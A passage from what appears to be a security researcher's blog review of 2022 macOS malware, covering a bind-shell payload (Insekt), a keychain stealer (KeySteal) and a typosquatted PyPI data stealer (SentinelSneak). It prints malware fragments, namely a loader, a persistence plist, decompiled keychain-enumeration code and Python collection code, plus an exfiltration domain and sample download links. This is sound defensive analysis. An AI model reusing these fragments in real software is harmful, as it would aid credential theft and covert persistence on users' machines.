0x00000000000ff3ac                        db  0x62 ; &#39;b&#39;
0x00000000000ff3ad                        db  0x69 ; &#39;i&#39;
0x00000000000ff3ae                        db  0x6e ; &#39;n&#39;
0x00000000000ff3af                        db  0x2f ; &#39;/&#39;
0x00000000000ff3b0                        db  0x73 ; &#39;s&#39;
0x00000000000ff3b1                        db  0x68 ; &#39;h&#39;
</code></pre><p>As the file, <code>payload.so</code> is a dynamic library (dylib) it cannot be directly executed &hellip;instead it needs a loader. For analysis purposes let&rsquo;s write a simple loader that <code>dlopen</code>s <code>payload.so</code> and invokes one of its exported function.</p>
<p>First, let&rsquo;s dump the exports via <code>nm</code> (using the <code>-gu</code> command line flags):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% nm -gU ~/Downloads/payload.so

00000000000fdf30 T _gconv
00000000000fdf70 T _gconv_init
...

</pre>
</div>
<p>We&rsquo;ll call the <code>gconv_init</code> export as its contains the bind-shell logic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>handle <span style="color:#f92672">=</span> dlopen(<span style="color:#e6db74">&#34;./payload.so&#34;</span>, RTLD_LAZY);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>fptr)(<span style="color:#66d9ef">void</span>) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span>))dlsym(handle, <span style="color:#e6db74">&#34;gconv_init&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>  (<span style="color:#f92672">*</span>fptr)();</span></span></code></pre></div>
<div class="note">
File and network events are reported at the process level. Thus in the following output(s), the events are attributed to our (custom) loader ...which has loaded and executed the payload.so dynamic library. 
<p>The file and network events themselves however are triggered by code within the payload.so</p>
</div>
<p>While running a <a href="https://objective-see.com/products/utilities.html#FileMonitor">File Monitor</a>:, we first observe <code>payload.so</code> self deleting. In the decompilation this is realized via a call to GO&rsquo;s <code>os.removeAll</code> function.</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# FileMonitor.app/Contents/MacOS/FileMonitor -pretty
...
{
  "event" : "ES_EVENT_TYPE_NOTIFY_UNLINK",
  "file" : {
    "destination" : "/Users/user/Downloads/payload.so",
    "process" : {
      "pid" : 13363
      "name" : "loader",
      "path" : "/Users/user/Downloads/loader",
    }
  }
}
</pre>
</div>
<p>Then, the bind-shell logic is executed, which results in a listening socket, readily observable via <a href="https://objective-see.com/products/netiquette.html"><code>Netiquette</code></a>:</p>
<p><img src="../images/blog/blog_0x71/isListen.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Listening Socket</center>

<br></p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>Insekt</code> include the following (credit: Talos):</p>
<ul>
<li>Executable Components:
<ul>
<li><code>exploit</code>: <br>
<code>ef130f1941077ffe383fe90e241620dde771cd0dd496dad29d2048d5fc478faf</code></li>
<li><code>payload.so</code>: <br>
<code>ae9f370c89f0191492ed9c17a224d9c41778b47ca2768f732b4de6ee7d0d1459</code></li>
</ul>
</li>
</ul>
<p>Talos, has <a href="https://github.com/Cisco-Talos/IOCs/tree/main/2022/10">published a full list of IoCs</a> which should also be consulted.
<br>
<br></p>
<h3 id="-keysteal">üëæ <strong><code>KeySteal</code></strong></h3>
<div class="note">
<p>KeySteal, as its name implies is a simple keychain stealer, embedded in a trojanized copy of a popular free application.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/KeySteal.zip"><code>KeySteal</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In November, researchers from TrendMicro published a report, details how a copy of the open-source <code>ResignTool</code> was packaged up with keychain-stealing malware</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">ResignTool, a convenient and practical application in Apple devices has been infiltrated by a piece of <a href="https://twitter.com/hashtag/malware?src=hash&amp;ref_src=twsrc%5Etfw">#malware</a> to steal Keychain information. More details: <a href="https://t.co/FRhjrO5Al5">https://t.co/FRhjrO5Al5</a></p>&mdash; Trend Micro Research (@TrendMicroRSRCH) <a href="https://twitter.com/TrendMicroRSRCH/status/1594012627231215616?ref_src=twsrc%5Etfw">November 19, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://www.trendmicro.com/en_us/research/22/k/pilfered-keys-free-app-infected-by-malware-steals-keychain-data.html">&ldquo;Pilfered Keys: Free App Infected by Malware Steals Keychain Data&rdquo;</a></li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> Unknown</span></p>
<p>The TrendMicro researchers discovered the malware on VirusTotal:</p>
<blockquote>
  "<i>The sample was discovered on VirusTotal by one of our sourcing rules. It was not yet reported to be in the wild but was submitted in VirusTotal under the name archive.pkg.</i>" -TrendMicro 
</blockquote>
<br>
<img src="../images/blog/blog_0x71/ksVT.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">KeySteal, submitted to VirusTotal</center>

<p>As noted, it was not (yet) seen in the wild, and as such, we don&rsquo;t currently know its infection vector. However, as the sample was packaged up in a <code>.pkg</code>, it is likely that infection would require user-interaction (vs. say a remote exploit).</p>
<p>Its worth noting that though the package was signed, as shown by <a href="https://objective-see.com/products/whatsyoursign.html"><code>WhatsYourSign</code></a>, Apple has now revoked the certificate:</p>
<img src="../images/blog/blog_0x71/ksRevoked.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Code-Signing Certificate, now Revoked</center>

<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> Launch Item </span>
</p>
<p>Using the <a href="https://mothersruin.com/software/SuspiciousPackage/">Suspicious Package</a> utility, we can examine the malicious packages, noting that it will create the following:</p>
<ul>
<li>a (trojanized) copy of the popular <code>ResignTool</code> in <code>/Applications</code></li>
<li>a persistent Launch Daemon property list file <code>com.apple.googlechrome.plist</code></li>
<li>a binary named <code>Google Chrome</code> in <code>/Library/QuickTime</code></li>
</ul>
<img src="../images/blog/blog_0x71/ksSP.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Package Contents / Installed Files</center>

<p>Let&rsquo;s take a peek at the <code>com.apple.googlechrome.plist</code> file:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; ...&#34;&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#f92672">&lt;plist</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#f92672">&lt;key&gt;</span>KeepAlive<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  <span style="color:#f92672">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  <span style="color:#f92672">&lt;key&gt;</span>Label<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#f92672">&lt;string&gt;</span>com.apple.googlechrome<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="color:#f92672">&lt;key&gt;</span>Program<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  <span style="color:#f92672">&lt;string&gt;</span>/Library/QuickTime/Google Chrome<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>  <span style="color:#f92672">&lt;key&gt;</span>RunAtLoad<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  <span style="color:#f92672">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#f92672">&lt;/plist&gt;</span></span></span></code></pre></div></p>
<p>In the <code>ProgramArguments</code> key we can see the path to the persistent location of the malware: <code>/Library/QuickTime/Google Chrome</code>. Also, as the <code>RunAtLoad</code> key is set to <code>true</code>, the malware will be automatically restarted each time the user logs in. Persistence achieved!
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Keychain Stealer
</span>
</p>
<p>The TrendMicro researchers noted that both binaries dropped by the malware (<code>ResignTool.app</code> &amp; <code>Google Chrome</code>) are designed to steal victim&rsquo;s keychains.</p>
<p><blockquote>
  "<i>...[the] ResignTool is where the operations of the malware function and this is how they steal the victim's keychain data.
  
  The other dropped file [Google Chrome], has similar keychain stealing routine of the ResignTool binary.</i>" -TrendMicro 
</blockquote>
<br></p>
<div class="note">
Keychains on macOS contain a host of sensitive information such as password, private certificates, and more. 
</div>
<p>The malware (as pointed out by TrendMicro) will look for keychain data in the following locations on an infected machine:</p>
<ul>
<li>~/Keychains</li>
<li>/Library/Keychains</li>
<li>~/MobileDevice/Provisioning Profiles</li>
</ul>
<p>We can find these strings, embedded in the malware:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% strings - "KeySteal/Google Chrome"

...
%@/Keychains
keychain
keychain-db
/Library/Keychains/
%@/MobileDevice/Provisioning Profiles
mobileprovision
%@/%@
.mobileprovision

</pre>
</div>
<p>In a disassembler, we can decompile the malware&rsquo;s code to find a snippet of this code (specifically in a function found at <code>0x00000001000021f8</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>r15 <span style="color:#f92672">=</span> [[NSFileManager defaultManager] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>rax <span style="color:#f92672">=</span> NSSearchPathForDirectoriesInDomains(<span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x1</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>rbx <span style="color:#f92672">=</span> [[NSString stringWithFormat:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;%@/Keychains&#34;</span>, r12] retain];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>rax <span style="color:#f92672">=</span> [r15 enumeratorAtPath:rbx];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>rax <span style="color:#f92672">=</span> [rax countByEnumeratingWithState:<span style="color:#f92672">&amp;</span>var_4F0 objects:<span style="color:#f92672">&amp;</span>var_B0 count:<span style="color:#ae81ff">0x10</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span><span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      rax <span style="color:#f92672">=</span> (rbx)(r13, <span style="color:#960050;background-color:#1e0010">@</span>selector(pathExtension));
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      r12 <span style="color:#f92672">=</span> [rax isEqualTo:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;keychain&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>      <span style="color:#66d9ef">if</span> (r12 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        rax <span style="color:#f92672">=</span> [r13 pathExtension];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>        r12 <span style="color:#f92672">=</span> [rax isEqualTo:<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#e6db74">&#34;keychain-db&#34;</span>];                              
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>...</span></span></code></pre></div>
<p>Keychain data is then exfiltrated to the attacker&rsquo;s server (found at <code>usa.4jrb7xn8rxsn8o4lghk7lx6vnvnvazva.com</code>) via a call to method named: <code>encryptBase64Data</code>.</p>
<p>
  <img src="../images/blog/blog_0x71/iocs.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Indicators of Compromise (IoCs):</b></span>
</p>
<p>IoCs for <code>KeySteal</code> include the following (credit: TrendMicro):</p>
<ul>
<li>
<p>Executable Components:</p>
<ul>
<li><code>/Applications/ResignTool.app</code>: <br>
<code>410da3923ea30d5fdd69b9ae69716b094d276cc609f76590369ff254f71c65da</code>
<br></li>
<li><code>/Library/QuickTime/Google Chrome</code>:<br>
<code>f5b4a388fee4183dfa46908000c5c50dceb4bf8025c4cfcb4d478c5d03833202</code>
<br></li>
</ul>
</li>
<li>
<p>Files/Directories:</p>
<ul>
<li><code>/Library/QuickTime/</code></li>
<li><code>/Library/LaunchDaemons/com.apple.googlechrome.plist</code></li>
</ul>
</li>
<li>
<p>Network:</p>
<ul>
<li><code>usa.4jrb7xn8rxsn8o4lghk7lx6vnvnvazva.com/</code></li>
</ul>
</li>
</ul>
<br>
<h3 id="-sentinelsneak">üëæ <strong><code>SentinelSneak</code></strong></h3>
<div class="note">
<p>Relying on a &ldquo;typosquatting&rdquo; attack, this malicious Python package targeted developers with the goal of exfiltrating sensitive data.</p>
<p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://github.com/objective-see/Malware/raw/main/SentinelSneak.zip"><code>SentinelSneak</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>A week before 2022 ended, researchers from ReversingLabs <a href="https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk">published a report</a>, detailing the discovery of a malicious Python package that masquerades as a legitimate one.</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">The latest edition of The Week in <a href="https://twitter.com/hashtag/Security?src=hash&amp;ref_src=twsrc%5Etfw">#Security</a> is here. This week: <a href="https://twitter.com/hashtag/Okta?src=hash&amp;ref_src=twsrc%5Etfw">#Okta</a> is hit with another security incident involving its private <a href="https://twitter.com/hashtag/GitHub?src=hash&amp;ref_src=twsrc%5Etfw">#GitHub</a> repos. Also: <a href="https://twitter.com/ReversingLabs?ref_src=twsrc%5Etfw">@ReversingLabs</a> researchers discovered a malicious <a href="https://twitter.com/hashtag/PyPI?src=hash&amp;ref_src=twsrc%5Etfw">#PyPI</a> package posing as a <a href="https://twitter.com/hashtag/SentinelOne?src=hash&amp;ref_src=twsrc%5Etfw">#SentinelOne</a> <a href="https://twitter.com/hashtag/SDK?src=hash&amp;ref_src=twsrc%5Etfw">#SDK</a> client. <a href="https://t.co/Nhskl2p2QQ">https://t.co/Nhskl2p2QQ</a></p>&mdash; ReversingLabs (@ReversingLabs) <a href="https://twitter.com/ReversingLabs/status/1606003388465954816?ref_src=twsrc%5Etfw">December 22, 2022</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li><a href="https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk">&ldquo;SentinelSneak: Malicious PyPI module poses as security software development kit&rdquo;</a></li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector:</b> TypoSquatting</span></p>
<p>The ReversingLabs write-up describes <code>SentinelSneak</code>&rsquo;s infection vector:</p>
<blockquote>
  "<i>A malicious Python package [containing `SentinelSneak`] is posing as a software development kit (SDK) for the security firm SentinelOne.... The package, SentinelOne has no connection to the noted threat detection firm of the same name and was... uploaded to PyPI, the Python Package Index.

  The `SentinelOne` imposter package is just the latest threat to leverage the PyPI repository and underscores the growing threat to software supply chains, as malicious actors use strategies like ‚Äútyposquatting‚Äù to exploit developer confusion and push malicious code into development pipelines and legitimate applications.</i>" -ReversingLabs 
</blockquote>
<br>
<img src="../images/blog/blog_0x71/ssPackage.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Malicious &#39;TypoSquatting&#39; Package (credit: ReversingLabs)</center>

<p>As was the case with the other malware of 2022 the spread via &ldquo;typosquatting&rdquo; attacks (e.g. <code>CrateDepression</code> and <code>Pymafka</code> ) <code>SentinelSneak</code> would infect users who inadvertently downloaded it while looking for the legitimate SentinelOne API Python Package (<code>SentinelOne4py</code>).</p>
<p>Worth noting too, simply downloading/installing package won&rsquo;t trigger an infection. Instead it most be used programmatically:</p>
<blockquote>
  "<i>The malicious functionality in the library does not execute upon installation, but waits to be called on programmatically before activating ‚Äî a possible effort to avoid detection.</i>" -ReversingLabs 
</blockquote>
<p>&hellip;this sneakiness lead to its name; <code>SentinelSneak</code>.
<br></p>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> None? </span>
</p>
<p>It does not appear that <code>SentinelSneak</code> persists. Instead (as we&rsquo;ll show below in the &lsquo;Capabilities&rsquo; section), its goal is merely to exfiltrate sensitive files to a remote server.</p>
<p>However it appears that each time the malicious library is programmatically utilized, the malicious code with be (re)executed, and thus exfiltration can occur multiple times.
<br></p>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Data Stealer
</span>
</p>
<p>The sole goal of <code>SentinelSneak</code> is to steal (exfiltrate) sensitive developer-related files off an infected machine:</p>
<blockquote>
  "<i>A detailed analysis of [the malicious] code revealed capabilities that are focused on exfiltration of data that is characteristic for development environments.</i>" -ReversingLabs 
</blockquote>
<p>The malicious logic to perform such exfiltration is found in file named <code>api.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>platform <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;darwin&#34;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>        writeFile()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>platform <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;linux&#34;</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>        writeFile1()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#f92672">...</span></span></span></code></pre></div>
<p>First, we find a snippet in the <code>run</code> method that invokes platform specific-logic. Here, we&rsquo;ll focus on the <code>darwin</code> (macOS) code &hellip;found in a method named <code>writeFile</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">writeFile</span>(serialId<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;default&#39;</span>):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    username <span style="color:#f92672">=</span> get_username()
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    foldername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    zipname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp.zip&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/Users/&#39;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/Library/Logs/tmp/tmp.txt&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(foldername):
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#75715e"># print(&#39;11111&#39;)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>        shutil<span style="color:#f92672">.</span>rmtree(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    os<span style="color:#f92672">.</span>makedirs(foldername)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">with</span> open(filename, <span style="color:#e6db74">&#39;a+&#39;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;hosts : [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(get_hosts()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;username : &#39;</span> <span style="color:#f92672">+</span> get_username() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>        file<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;test : [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">]&#39;</span><span style="color:#f92672">.</span>format(subprocess_popen(<span style="color:#e6db74">&#34;bash -c ls /&#34;</span>)) <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
